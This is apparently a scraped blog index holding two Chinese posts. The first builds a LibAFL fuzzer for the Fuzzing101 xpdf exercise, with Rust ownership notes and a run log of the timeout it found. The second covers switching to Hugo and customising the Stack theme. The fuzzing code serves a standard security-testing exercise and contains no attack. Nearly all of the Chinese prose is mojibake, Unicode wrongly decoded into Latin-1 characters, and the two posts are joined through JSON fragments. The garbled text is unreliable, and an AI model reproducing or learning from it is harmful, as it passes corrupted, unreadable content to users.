å¾€å¾€ä¼šè¿›è¡Œå¤šé˜¶æ®µçš„æ“ä½œã€‚å¦‚ AFL ä¸­çš„ random havoc stageã€‚ Observerï¼šæä¾›ä¸€æ¬¡æ‰§è¡Œç›®æ ‡ç¨‹åºçš„ä¿¡æ¯ã€‚ å¸¸ç”¨çš„ coverage map å°±æ˜¯ä¸€ç§ observerã€‚ Executorï¼šç”¨ fuzzer çš„è¾“å…¥æ¥æ‰§è¡Œç›®æ ‡ç¨‹åºã€‚ ä¸åŒ fuzzer åœ¨è¿™æ–¹é¢åŒºåˆ«å¾ˆå¤§ã€‚ Feedbackï¼šå°†ç¨‹åºæ‰§è¡Œçš„ç»“æœåˆ†ç±»ä»¥å†³å®šæ˜¯å¦å°†å…¶åŠ å…¥ corpusã€‚ feedback é€šå¸¸å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ª observer æŠ¥å‘Šçš„ä¿¡æ¯æ¥åˆ¤æ–­ execution æ˜¯å¦ â€œinterestingâ€ï¼Œæ˜¯å¦æ˜¯æ»¡è¶³æ¡ä»¶çš„ solutionï¼Œæ¯”å¦‚å¯è§‚æµ‹çš„ crashã€‚ Mutatorï¼šä»ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å…¥ç”Ÿæˆæ–°çš„ testcaseã€‚ é€šå¸¸æ˜¯æœ€å¸¸æ”¹åŠ¨çš„ï¼Œä¸åŒ mutator å¯ä»¥ç»„åˆï¼Œå¾€å¾€è¿˜å’Œç‰¹å®šçš„è¾“å…¥ç±»å‹ç»‘å®šã€‚ Generatorï¼šå‡­ç©ºäº§ç”Ÿæ–°çš„è¾“å…¥ã€‚ æœ‰éšæœºç”Ÿæˆçš„ï¼Œä¹Ÿæœ‰ Nautilus è¿™ç§åŸºäºè¯­æ³•çš„ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ LibAFL å®ç°ä¸­è¿˜æœ‰è‹¥å¹²é‡è¦ç»„ä»¶ï¼š\nAPIæ–‡æ¡£ è¯· å‚é˜…\nState: åŒ…å«äº†è¿è¡Œæ—¶çš„æ‰€æœ‰å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬ Corpusã€RNG ç­‰ã€‚ Bolts: å·¥å…·åº“ï¼Œå®ç°äº†è¯¸å¦‚å…±äº«å†…å­˜çš„æ”¯æŒã€‚ Monitor: å‘ç”¨æˆ·æ‰“å°logä¹‹ç±»ã€‚ Events: ç»„ä»¶ä¹‹é—´é€šä¿¡ Fuzzer: é¡¶å±‚ç»„ä»¶ï¼ŒæŠŠä¸€åˆ‡ç»„ç»‡èµ·æ¥ å› åŸåšå®¢çš„è®²è§£å¾ˆè¯¦ç»†ï¼Œä¸”æä¾›äº†å®Œæ•´ä»£ç ã€‚æ•…æœ¬æ–‡è¯•å›¾åˆ‡æ¢è§†è§’ï¼Œä»è‡ªé¡¶å‘ä¸‹çš„è§’åº¦æ‹†è§£ä»£ç ï¼š\nç»„ä»¶ï¼šFuzzer 1 2 3 4 5 6 7 8 let monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); let mut mgr = SimpleEventManager::new(monitor); let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); let mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); -------------8\u0026lt;------------- let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); fuzzer.fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr)?; å¯ä»¥çœ‹åˆ° StdFuzzer ä¸²è”èµ·äº†å…¨éƒ¨ç»„ä»¶ã€‚mgrã€schedulerã€mutatorã€stages éƒ½æ˜¯ä½¿ç”¨åº“è‡ªå¸¦çš„ç±»ï¼Œå›ºçœç•¥ä¹‹ï¼Œä¸‹é¢è¯¦è¿°å¤æ‚äº›çš„ç»„ä»¶ã€‚\nç»„ä»¶ï¼šState 1 2 3 4 5 6 7 let mut state = StdState::new( StdRand::with_seed(current_nanos()), input_corpus, timeouts_corpus, \u0026amp;mut feedback, \u0026amp;mut objective, )?; æŸ¥é˜…æ–‡æ¡£å¯çŸ¥StdStateçš„æˆå‘˜å«ä¹‰ï¼Œè¿™äº›æˆå‘˜å°±æ˜¯Fuzzerçš„å…¨éƒ¨çŠ¶æ€äº†ã€‚ä¸€ä¸ªå¯èƒ½çš„ç–‘æƒ‘æ˜¯ä¸ºä»€ä¹ˆä¼šæœ‰feedbackã€objectiveä¸¤ç§ Feedbackï¼Œè®©æˆ‘ä»¬ç»§ç»­å‘ä¸Šæ£€é˜…ä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 pub fn new\u0026lt;F, O\u0026gt;( rand: R, corpus: C, solutions: SC, feedback: \u0026amp;mut F, objective: \u0026amp;mut O ) -\u0026gt; Result\u0026lt;Self, Error\u0026gt; where F: Feedback\u0026lt;Self\u0026gt;, O: Feedback\u0026lt;Self\u0026gt;, Rust åŸºç¡€ä¹‹æ‰€æœ‰æƒ æ‰€æœ‰æƒï¼Œæ˜¯ Rust ç‰¹æœ‰çš„è®¾è®¡ï¼Œåœ¨æ— GCçš„å‰æä¸‹å®ç°å†…å­˜å®‰å…¨ä¸é«˜æ€§èƒ½ã€‚åŸºæœ¬è§„åˆ™ï¼š\nRust ä¸­æ¯ä¸€ä¸ªå€¼éƒ½è¢«ä¸€ä¸ªå˜é‡æ‰€æ‹¥æœ‰ï¼Œè¯¥å˜é‡è¢«ç§°ä¸ºå€¼çš„æ‰€æœ‰è€… ä¸€ä¸ªå€¼åŒæ—¶åªèƒ½è¢«ä¸€ä¸ªå˜é‡æ‰€æ‹¥æœ‰ï¼Œæˆ–è€…è¯´ä¸€ä¸ªå€¼åªèƒ½æ‹¥æœ‰ä¸€ä¸ªæ‰€æœ‰è€… å½“æ‰€æœ‰è€…(å˜é‡)ç¦»å¼€ä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œè¿™ä¸ªå€¼å°†è¢«ä¸¢å¼ƒ(drop) åŸºäºè¿™äº›åŸåˆ™ï¼Œå½“ä¸€ä¸ªå€¼è¢«å¦ä¸€ä¸ªå˜é‡ä½¿ç”¨æ—¶ï¼Œä¼šå‘ç”Ÿæ‰€æœ‰æƒçš„è½¬ç§»ï¼Œå…ˆå‰çš„å˜é‡ä¾¿ä¸èƒ½è®¿é—®è¯¥å€¼ã€‚\n1 2 3 let s1 = String::from(\u0026#34;hello\u0026#34;); let s2 = s1; println!(\u0026#34;{}, world!\u0026#34;, s1); // æŠ¥é”™ï¼ 1 2 3 let s1 = String::from(\u0026#34;hello\u0026#34;); let s2 = s1.clone(); println!(\u0026#34;{}, world!\u0026#34;, s1); // ä¸æŠ¥é”™ 1 2 3 let x = 5; let y = x; println!(\u0026#34;x = {}, y = {}\u0026#34;, x, y); // ä¸æŠ¥é”™ è½¬ç§»(move) å’Œ æ‹·è´(copy) let s2 = s1;åœ¨ Rust ä¸­è¢«ç§°ä¸ºå˜é‡ç»‘å®šï¼Œä»£è¡¨s1è¢«ç§»åŠ¨åˆ°äº†s2ã€‚\nå¦‚æœæƒ³è¦è®¿é—®ç›¸åŒå€¼ï¼Œéœ€è¦å¯¹å˜é‡è¿›è¡Œæ‹·è´ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œintç±»å‹æ²¡æœ‰æ‹·è´ä¹Ÿä¸æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºåŸºæœ¬ç±»å‹çš„å¤§å°æ˜¯å·²çŸ¥çš„ï¼Œä¸”åˆ†é…åœ¨æ ˆä¸Šï¼Œå¯¹ä»–çš„æ‹·è´æ¯”è¾ƒç®€å•ï¼Œæ•… Rust è‡ªåŠ¨å®ç°äº†æ‹·è´ã€‚è€ŒStringæ˜¯å¤æ‚ç±»å‹ï¼Œå¿…é¡»æ˜¾å¼çš„æ‹·è´ã€‚\nå¼•ç”¨(reference) å’Œ å€Ÿç”¨(borrowing) å°†å€¼åœ¨å˜é‡ä¹‹é—´ä¼ æ¥ä¼ å»ç¡®å®æ¯”è¾ƒéº»çƒ¦ã€‚ Rustå®ç°äº†2ç§å¼•ç”¨ï¼š\n\u0026amp;: ä¸å¯å˜å¼•ç”¨ï¼Œå…è®¸ä½¿ç”¨å€¼ä½†ä¸è·å–æ‰€æœ‰æƒã€‚å¯ä»¥æœ‰å¤šä¸ªã€‚ \u0026amp;mut: å¯å˜å¼•ç”¨ã€‚ä»…èƒ½å­˜åœ¨ä¸€ä¸ªã€‚ å¯å˜å¼•ç”¨ä¸ä¸å¯å˜å¼•ç”¨ä¸èƒ½åŒæ—¶å­˜åœ¨ã€‚ è·å–å˜é‡çš„å¼•ç”¨ï¼Œå°±ç§°ä¸ºå€Ÿç”¨ã€‚æ˜¾ç„¶ï¼Œåœ¨ç¦»å¼€ä½œç”¨åŸŸåæ‰€æœ‰æƒå°†è¢«å½’è¿˜ã€‚å¼•ç”¨çš„ä½œç”¨åŸŸä»åˆ›å»ºä¸€ç›´æŒç»­åˆ°å®ƒæœ€åä¸€æ¬¡ä½¿ç”¨ï¼Œè€Œå˜é‡çš„ä½œç”¨åŸŸä»åˆ›å»ºæŒç»­åˆ°æŸä¸€ä¸ªèŠ±æ‹¬å·}ã€‚\nå¯¹å¼•ç”¨æœ‰æ•ˆæ€§çš„æ£€æŸ¥æ˜¯ Rust è§£å†³æ•°æ®ç«äº‰ï¼Œæ‚¬å‚æŒ‡é’ˆç­‰å®‰å…¨é—®é¢˜çš„é‡è¦æœºåˆ¶ã€‚\nåœ¨æœ¬é¡¹ç›®ä¸­ï¼Œéœ€è¦feedbackå’Œobjectiveéšç€stateæ›´æ–°è€Œä¸æ–­ç§¯ç´¯ï¼Œå› æ­¤ä½¿ç”¨å¯å˜å¼•ç”¨ã€‚è€Œå…¶ä»–æˆå‘˜å’Œstateç›¸å…³ï¼Œæ•…ç›´æ¥å°†æ‰€æœ‰æƒç§»äº¤ç»™stateã€‚\nå‚è€ƒæ–‡æ¡£ï¼šhttps://course.rs/basic/ownership/ownership.html\nç»„ä»¶ï¼šObserver \u0026amp; Feedback 1 2 3 4 5 6 7 8 9 10 11 12 13 let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); let edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; let mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!( TimeoutFeedback::new(), MaxMapFeedback::new(\u0026amp;edges_observer) ); å¦‚å®šä¹‰æ‰€è¨€ï¼ŒObserver ä»…æä¾›ä¿¡æ¯ï¼ŒFeedback å°†è§‚å¯Ÿåˆ°çš„ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ã€‚ åœ¨æœ¬ä¾‹ä¸­ï¼Œé¦–å…ˆå®šä¹‰çš„ä¸¤ä¸ªObserveråˆ†åˆ«æä¾›äº†ä»£ç è¿è¡Œæ—¶é—´å’Œä¾¿è¦†ç›–ç‡çš„ä¿¡æ¯ã€‚ ç„¶ååˆ†å¸ƒå¯¹ä»–ä»¬è¿›è¡Œäº†ä¸åŒçš„åé¦ˆåˆ¤æ–­ã€‚feedback_orå’Œfeedback_and_fastæ˜¯é€»è¾‘åˆ¤æ–­å®ã€‚å› æ­¤å¯ä»¥è§£è¯»ä»–ä»¬çš„é€»è¾‘ï¼š\nfeedbackçš„æ¡ä»¶æ˜¯è¦†ç›–äº†æ–°çš„åˆ†æ”¯ æˆ– â€œè¿è¡Œæ—¶é—´åé¦ˆâ€ã€‚æ•…åé¦ˆçš„æ˜¯æœ‰è¶£çš„æ ·ä¾‹(interesting testcase) å®é™…ä¸Šï¼Œâ€œè¿è¡Œæ—¶é—´åé¦ˆâ€æ°¸è¿œä¸ä¼šçœŸçš„åé¦ˆï¼Œéœ€è¦é…åˆå…¶ä»–åé¦ˆä½¿ç”¨ã€‚è¿™é‡Œä»…ä½œç¤ºä¾‹ã€‚ objectiveçš„æ¡ä»¶æ˜¯è¦†ç›–äº†æ–°çš„åˆ†æ”¯ ä¸” è¿è¡Œè¶…æ—¶ã€‚æ•…åé¦ˆçš„æ˜¯èƒ½è§¦å‘æ— é™é€’å½’æ¼æ´çš„æ ·ä¾‹ï¼Œå³æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼ˆsolutionï¼‰ ç»„ä»¶ï¼šExecutor 1 2 3 4 5 6 7 let fork_server = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) .coverage_map_size(MAP_SIZE) .build(tuple_list!(time_observer, edges_observer))?; let timeout = Duration::from_secs(5); let mut executor = TimeoutForkserverExecutor::new(fork_server, timeout)?; æˆ‘ä»¬çš„ Executor è¿˜æ˜¯é‡‡ç”¨ç»å…¸çš„ forkserver æ¶æ„ï¼Œæ„å»º Executor æ—¶ï¼Œé¦–å…ˆåŠ å…¥äº†ä¸¤ä¸ª Observer ï¼Œç„¶åæŒ‡å®šäº†è¶…æ—¶æ—¶é—´ï¼Œæœ‰åŠ©äºå¢åŠ fuzzååé‡ã€‚\nè·‘ğŸƒâ€ æ€»ä¹‹å€ŸåŠ© LibAFL çš„æ¡†æ¶ï¼Œå†™ä¸€ä¸ª Fuzzer è¿˜æ˜¯å¾ˆæ¸…æ™°çš„ã€‚ï¼ˆæˆ–è®¸è‹¥å¹²å¹´åçš„ Fuzzing å­¦ä¹ è€…å°±ä¸ç”¨å•ƒAFLçš„1000è¡Œæºç äº†ğŸ˜­ï¼‰\næœ€åè·‘å‡ºæ¥ä¸€ä¸ªæ­»å¾ªç¯ã€‚ğŸ‘´å®£å¸ƒå®éªŒä¸€å®Œæˆã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [AFL++ 798a8ebfa8a4] /fuzzing101/exercise-1 # ./xpdf/install/bin/pdftotext ./timeouts/c497979e26a808e9 Error: PDF file is damaged - attempting to reconstruct xref table... Error (2459): Dictionary key must be a name object Error (2465): Illegal character \u0026#39;\u0026gt;\u0026#39; Error (2468): Dictionary key must be a name object Error (2471): Dictionary key must be a name object Error (2486): Dictionary key must be a name object Error (2488): Illegal character \u0026lt;2f\u0026gt; in hex string Error (2489): Illegal character \u0026lt;78\u0026gt; in hex string Error (2490): Illegal character \u0026lt;6d\u0026gt; in hex string Error (2491): Illegal character \u0026lt;70\u0026gt; in hex string Error (2492): Illegal character \u0026lt;3a\u0026gt; in hex string Error (2493): Illegal character \u0026lt;4d\u0026gt; in hex string Error (2494): Illegal character \u0026lt;6f\u0026gt; in hex string Error (2496): Illegal character \u0026lt;69\u0026gt; in hex string Error (2498): Illegal character \u0026lt;79\u0026gt; in hex string Error (2501): Illegal character \u0026lt;74\u0026gt; in hex string Error (2503): Dictionary key must be a name object -------------8\u0026lt;------------- ","date":"2023-07-26T02:54:55+08:00","image":"https://lonelyuan.github.io/p/libafl%E9%80%9F%E9%80%9Afuzzing101-1/exe1_hu040a15c83346252047b5ebf7d9d42a76_312292_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/libafl%E9%80%9F%E9%80%9Afuzzing101-1/","title":"libAFLé€Ÿé€šFuzzing101 (1)"},{"content":"å†å²ç¯‡ ä½ ä»¬ CLI ç¡®å®æ¯” GUI æœ‰ç‚¹ç´ è´¨ è¦è®ºè®¡ç®—æœºäººçš„å…¸ä¸­å…¸ï¼Œè¿˜å¾—æ˜¯nå¹´ä¸æ›´æ–°åªæœ‰å¯¥å¯¥å‡ ç¯‡æ–‡ç« çš„ Hexo åšå®¢ã€‚å®ƒä»£è¡¨ç€å‘½ä»¤è¡Œåˆå­¦è€…çš„å…´å¥‹ï¼Œç¬¬ä¸€æ¬¡é… node ç¯å¢ƒæˆåŠŸåçš„å–œæ‚¦ï¼Œä»¥åŠä¸€ä¸ªæœˆä¹‹åçš„ç–‘é—®ï¼š\nè¿™ç‚¹å±äº‹æˆ‘ä¸ºä»€ä¹ˆä¸å‘ç§‹ç§‹ç©ºé—´/å¾®åšï¼Ÿ åªæœ‰æˆ‘çœ‹æˆ‘ä¸ºä»€ä¹ˆä¸è®° Onenote/Notion ï¼Ÿ æƒ³è¦æµé‡æˆ‘ä¸ºä»€ä¹ˆä¸å‘çŸ¥ä¹/ç®€ä¹¦/è¥¿åŸƒæ–¯å¼Ÿæ©â€¦â€¦ï¼Ÿ å°½ç®¡ä»ç°åœ¨çœ‹ä»¿ä½›æ˜¯å‰æœé—è€ï¼Œä¸ªäººåšå®¢ä¾æ—§æ˜¯ä¸å­˜åœ¨äºä¸­æ–‡äº’è”ç½‘ä¸­çš„æå°‘æ•°é«˜è´¨é‡ä¸­æ–‡å†…å®¹ã€‚å®ƒä»£è¡¨ç€ RSS ï¼Œä»£è¡¨ç€æ°¸è¿œä¸ç”¨æ‹…å¿ƒè·‘è·¯å’Œå®¡æŸ¥ï¼Œæ˜¯ geek ä»¬çš„ç²¾ç¥è‡ªç•™åœ°ã€‚\nä½†æ˜¯ğŸ‘´è¿˜æ˜¯è§‰å¾—å‘ä¸€ç¯‡åšå®¢æ•²å¥½å‡ æ¡å‘½ä»¤éº»çƒ¦çš„è¦æ­»ã€‚å¤§æ¦‚æ˜¯ğŸ‘´ä¸å†å¹´è½»äº†ï¼ŒğŸ‘´å¼€å§‹è¿½æ±‚ç®€å•å®‰é€¸ï¼ŒåƒæŒ¨äº†é”¤çš„ç‰›ä¸€æ ·ã€‚äºæ˜¯ğŸ‘´æœ€ç»ˆé€‰ç”¨ Gridea ï¼Œä¸€ä¸ªåšå®¢å®¢æˆ·ç«¯ï¼Œå¯ä¸€é”®æ¨é€åˆ° Github Pageã€‚è¿™ç©æ„æœ‰äº›ä¸å¤ªè¶æ‰‹çš„åœ°æ–¹ï¼Œç­‰ğŸ‘´é—²æ¥æ— äº‹çš„æ—¶å€™æä¸€æäºŒæ¬¡å¼€å‘â€¦â€¦\nç„¶è€Œï¼ŒğŸ‘´è¿˜æ²¡ç­‰åˆ°é—²æ¥æ— äº‹çš„æ—¶å€™ï¼Œå‘è§‰Grideaä½œè€…å¼ƒå‘äº†ã€‚ã€‚ã€‚å…¶å®¢æˆ·ç«¯ï¼ˆelectronå®³äººä¸æµ…ï¼‰ç¼–è¾‘ä½“éªŒå·®ï¼Œgitæ›´æ–°è€å‡ºæ¯›ç—…ã€‚ä½œè€…ç°åœ¨åªæ›´æ–°webç«¯ï¼Œæ‰˜ç®¡åˆ°ä»–çš„äº‘æœåŠ¡ä¸‹é¢ã€‚ğŸ‘´è¿˜æ˜¯æ›´ç›¸ä¿¡githubä¸ä¼šè·‘è·¯ï¼Œæ‰€ä»¥ğŸ‘´è¿˜æ˜¯èµ¶ç´§è·‘è·¯å§ã€‚äºæ˜¯ï¼š\nä½ ä»¬ JS ç¡®å®æ¯” Go æœ‰ç‚¹ç´ è´¨ äºæ˜¯ğŸ‘´æœ€ç»ˆé€‰ç”¨ Hugo åšåšå®¢ï¼Œå› ä¸ºä¸ Hexo ç›¸æ¯” Hugo çš„è¿è¡Œé€Ÿåº¦å’Œç©ºé—´å ç”¨éƒ½ååˆ†è½»é‡ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œä½œä¸º Go å¼€å‘çš„é¡¹ç›®ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸éœ€è¦æ¼äººçš„é…ç¯å¢ƒç¯èŠ‚ã€‚ğŸ‘´çœ‹ä¸­äº† Stack ä¸»é¢˜ï¼Œä½†æ˜¯è¿™ä¸ªä¸»é¢˜ç”¨çš„äººä¸å°‘ï¼Œæœ‰äº›åƒç¯‡ä¸€å¾‹çš„å°´å°¬ã€‚ä¸ºæ­¤ğŸ‘´å†³å®šæ·±è€•æ¢çš®ä¹‹é“â€¦â€¦\nåŸç†ç¯‡ Hugo é¡¹ç›®ç»“æ„ 1 2 3 4 5 6 7 8 9 â”œâ”€â”€ archetypes # .md æ¨¡æ¿ â”‚ â””â”€â”€ default.md â”œâ”€â”€ config.toml # é…ç½®æ–‡ä»¶ â”œâ”€â”€ content # åœ¨è¿™å†™ä¸œè¥¿ â”œâ”€â”€ data # æ›´å¤šé…ç½®æ–‡ä»¶ â”œâ”€â”€ layouts # .html æ¨¡æ¿ â”œâ”€â”€ public # æ¸²æŸ“å¥½çš„ç½‘ç«™ â”œâ”€â”€ static # é™æ€æ–‡ä»¶ï¼Œhugoä¼šå…¨éƒ¨å¤åˆ¶ â””â”€â”€ themes # åšå®¢ä¸»é¢˜ content è¿™é‡Œæ˜¯ Hugo çš„è¾“å…¥ï¼Œå­˜æ”¾.mdæ ¼å¼çš„æ–‡ç« ã€‚ä½¿ç”¨hugo newå‘½ä»¤æ—¶ï¼Œä¼šå°è¯•ä»archetypesç›®å½•å¯»æ‰¾å¯¹åº”çš„æ¨¡æ¿ï¼Œæ¨¡æ¿é€šå¸¸ä»…åŒ…å«front matterï¼Œå®šä¹‰äº†æ–‡ç« çš„å…ƒå±æ€§ã€‚è¯­æ³•å¦‚ä¸‹ï¼š\nhugo new \u0026lt;SECTIONNAME\u0026gt;/\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\ncontentä¸­çš„å­æ–‡ä»¶å¤¹ç§°ä¸º sections ï¼Œå®ƒä»¬æ˜¯ç½‘ç«™å†…å®¹çš„åŸºæœ¬åˆ†å—ã€‚åˆ†å—çš„ç›®çš„æ˜¯åˆ†é…ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œå¦‚postéœ€è¦å±•ç¤ºæ–‡ç« åˆ—è¡¨ï¼Œpageä»…å±•ç¤ºå•ç‹¬é¡µé¢ç­‰ã€‚é…ç½®ä¸­çš„permalinksé¡¹å°±æ˜¯ä»¥åˆ†å—ä¸ºå•ä½åˆ†é…URLã€‚\npublic è¿™é‡Œæ˜¯ Hugo çš„è¾“å‡ºï¼Œå­˜æ”¾å®Œæ•´çš„ HTML é™æ€ç½‘é¡µã€‚ä½¿ç”¨hugoå‘½ä»¤æ—¶ï¼Œä¼šå°è¯•ä»layoutsç›®å½•å¯»æ‰¾å¯¹åº”çš„æ¨¡æ¿ï¼Œ HTML æ¨¡æ¿å‡ä»¥ GO æ¨¡æ¿è¯­æ³•ç¼–å†™ã€‚åœ¨å†™æ–‡ç« æ—¶ä¹Ÿå¯ä½¿ç”¨æ¨¡æ¿æ¥é¿å…å†™ HTML çš„ç¹æ‚ï¼Œå¦‚ Hugo æä¾›çš„å„ç§ shortcode ã€‚\nä»¥ Github Page ä¸ºä¾‹ï¼Œéƒ¨ç½²æ—¶ä»…éœ€å°†è¿™ä¸ªæ–‡ä»¶å¤¹åŒæ­¥è‡³ github.io ä»“åº“å³å¯ã€‚\nHugo è®¾è®¡ç†å¿µ ã€To be continuedã€‘ç¿»è¯‘ç¿»è¯‘å®˜æ–¹æ–‡æ¡£\nå¼€å‘ç¯‡ å¦‚ä½•ä¼˜é›…çš„äºŒæ¬¡å¼€å‘ï¼Ÿ è§‚å¯Ÿthemeçš„å†…å®¹ï¼Œä¼šå‘ç°é™¤äº†æ²¡æœ‰contentç›®å½•ä¹‹å¤–å’Œç½‘ç«™æ ¹ç›®å½•ç»“æ„å®Œå…¨ä¸€è‡´ã€‚ç”±æ­¤çŒœæµ‹ï¼Œæ‰€è°“themeä¹Ÿæ˜¯ä¸€ä¸ª siteï¼Œä½¿ç”¨themeå°±æ˜¯ç”¨å…¶æ¨¡æ¿è¦†ç›–æˆ‘ä»¬çš„ç½‘ç«™ã€‚\né‚£ä¹ˆï¼Œç›´æ¥ä¿®æ”¹themeç›®å½•é‡Œçš„å†…å®¹è‡ªç„¶å¯è¡Œï¼Œä½†å¦‚æœéœ€è¦å‡çº§ä¸»é¢˜ï¼Œåˆ™ä¼šäº§ç”Ÿè®¸å¤šè®¨åŒçš„mergeé—®é¢˜ã€‚å¦‚ä½•å®ç°æ•°æ®å’Œé…ç½®çš„è§£è€¦ï¼Ÿå®é™…ä¸Šï¼Œä¸Šè¿°å…³äºè¦†ç›–é¡ºåºçš„çŒœæƒ³å¹¶ä¸å‡†ç¡®ï¼Œå®é™…é¡ºåºæ˜¯ï¼šæœ¬åœ°æ¨¡æ¿â†’ä¸»é¢˜æ¨¡æ¿â†’é»˜è®¤æ¨¡æ¿ã€‚æ•…è€Œï¼Œåœ¨æœ¬åœ°æ¨¡æ¿ä¸­æ·»åŠ ç›¸åŒè·¯å¾„ä¸‹çš„åŒåæ¨¡æ¿æ–‡ä»¶ï¼Œå³å¯è¦†ç›–æ‰ä¸»é¢˜æ¨¡æ¿çš„é…ç½®ã€‚\nä»¥ Stack ä¸»é¢˜ä¸ºä¾‹ï¼Œå…¶åœ¨è®¸å¤šä½ç½®éƒ½å­˜åœ¨ç€è¯¸å¦‚hugo-theme-stack\\assets\\scss\\custom.scssçš„ç©ºç™½æ–‡ä»¶ï¼Œåªéœ€è¦åœ¨æ ¹ç›®å½•æ–°å»º\\assets\\scss\\custom.scsså³å¯æ·»åŠ å¯¹ CSS çš„æ”¹åŠ¨ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œä»¿ç…§ä¸»é¢˜æä¾›çš„demoç½‘ç«™å³å¯æ»¡è¶³ä¸€èˆ¬çš„äºŒæ¬¡å¼€å‘éœ€æ±‚ã€‚å…³äºæ¨¡æ¿æŸ¥æ‰¾é¡ºåºè¿˜æœ‰è¯¸å¤šç»†èŠ‚ï¼Œè¯·å‚é˜…å®˜æ–¹æ–‡æ¡£ï¼šTemplate lookup orderã€‚\narticleå…ƒä¿¡æ¯ï¼šlastmodï¼Œwordcount Hugo æœ¬èº«ä¸ºæ¯ç¯‡æ–‡ç« éƒ½ç»Ÿè®¡äº†ç›¸å…³å˜é‡ï¼Œä½† Stack ä¸»é¢˜æ²¡æœ‰å±•ç¤ºã€‚ä»F12å®šä½åˆ°ç›¸å…³å…ƒç´ ï¼Œå…¶æ¨¡æ¿åœ¨ï¼š\\themes\\hugo-theme-stack\\layouts\\partials\\article\\components\\details.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; {{ if $showDate }} \u0026lt;div\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;date\u0026#34; }} \u0026lt;time class=\u0026#34;article-time--published\u0026#34;\u0026gt; {{- .Date.Format (\u0026#34;2006-01-02\u0026#34;) -}} \u0026amp;nbsp;published \u0026lt;/time\u0026gt; {{- if ne .Lastmod .Date -}} \u0026lt;time class=\u0026#34;article-time--published\u0026#34;\u0026gt; {{- .Lastmod.Format (\u0026#34;2006-01-02\u0026#34;) -}} \u0026amp;nbsp;last modified {{- end -}} \u0026lt;/time\u0026gt; \u0026lt;/div\u0026gt; {{ end }} {{ if $showReadingTime }} \u0026lt;div\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;clock\u0026#34; }} \u0026lt;time class=\u0026#34;article-time--reading\u0026#34;\u0026gt; {{ T \u0026#34;article.readingTime\u0026#34; .ReadingTime }} \u0026lt;span class=\u0026#34;post-word-count\u0026#34;\u0026gt;, {{ .WordCount }} words\u0026lt;/span\u0026gt; \u0026lt;/time\u0026gt; \u0026lt;/div\u0026gt; {{ end }} æ³¨æ„ï¼ï¼ï¼\n{{- .Date.Format (\u0026quot;2006-01-02\u0026quot;) -}}é‡Œçš„æ—¥æœŸç»å¯¹ä¸èƒ½æ”¹ã€‚è¿™æ˜¯ä¸€ä¸ªgoè¯­è¨€ä¸­çš„æ ‡å‡†æ—¶é—´ç‚¹ï¼Œä¿®æ”¹åˆ™æ—¥æœŸè®¡ç®—ä¸æ­£ç¡®ã€‚æ›´å…·ä½“çš„æ—¶é—´ä¸ºï¼š\n1 2 {{ .Date.Format \u0026#34;2006-01-02 03:04:05 PM Z0700\u0026#34; }} {{ .Date.Format \u0026#34;06 Jan 02 Mon 15:04:05\u0026#34; }} ä»£ç å—ï¼šè¡Œå·ï¼Œçªå‡ºè¡Œ hugoæ¡†æ¶æœ¬èº«å°±æ”¯æŒï¼šï¼ˆä¸ºé¿å…è½¬è§£æåŠ äº†ç©ºæ ¼ï¼‰\n1 2 3 4 5 { {\u0026lt; highlight go-html-template \u0026#34;lineNos=inline, lineNoStart=42, hl_Lines=1\u0026#34; \u0026gt;}} {{ range .Pages }} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .RelPermalink }}\u0026#34;\u0026gt;{{ .LinkTitle }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} { {\u0026lt; /highlight \u0026gt;}} é¢„è§ˆï¼š\n42{{ range .Pages }} 43 \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .RelPermalink }}\u0026#34;\u0026gt;{{ .LinkTitle }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; 44{{ end }} é»˜è®¤ä»£ç é«˜äº®æ˜¯çœŸå¤Ÿå§ä¸‘ï¼Œèµ¶ç´§æ”¹æ”¹cssã€‚\né…è‰²ï¼Œå­—ä½“ ã€To be continuedã€‘\næ ‡é¢˜è·³è½¬ è¿™slackä¸»é¢˜å±…ç„¶æ ‡ç­¾æ—è¾¹æ²¡æœ‰è·³è½¬çš„å°é“¾æ¥æˆ‘ä¹Ÿæ˜¯æ²¡æƒ³åˆ°çš„ã€‚\nã€To be continuedã€‘\nä¿¡æ¯å— 